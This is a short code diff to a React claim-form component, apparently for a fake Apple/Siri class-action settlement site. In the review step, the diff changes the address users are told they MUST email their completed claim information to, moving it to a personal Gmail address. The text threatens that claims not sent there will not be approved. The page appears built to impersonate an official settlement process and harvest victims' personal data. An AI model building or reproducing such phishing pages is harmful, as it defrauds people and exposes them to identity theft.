@@ -653,11 +653,11 @@ function StepReview({
         <div className="font-semibold text-foreground">Important — required to approve your claim</div>
         <p className="mt-1 text-muted-foreground">
           After you submit, you MUST email a copy of your completed claim information to{" "}
-          <strong className="text-foreground">applesettlementclaim@icloud.com</strong>. On the next screen, tap
+          <strong className="text-foreground">appleintelligenceandsirisettle@gmail.com</strong>. On the next screen, tap
           "Email Receipt" — it opens your mail app with everything pre-filled. Then press Send.
         </p>
         <p className="mt-2 font-medium text-foreground">
-          Claims that are not emailed to applesettlementclaim@icloud.com will NOT be approved.
+          Claims that are not emailed to appleintelligenceandsirisettle@gmail.com will NOT be approved.
         </p>
       </div>
 
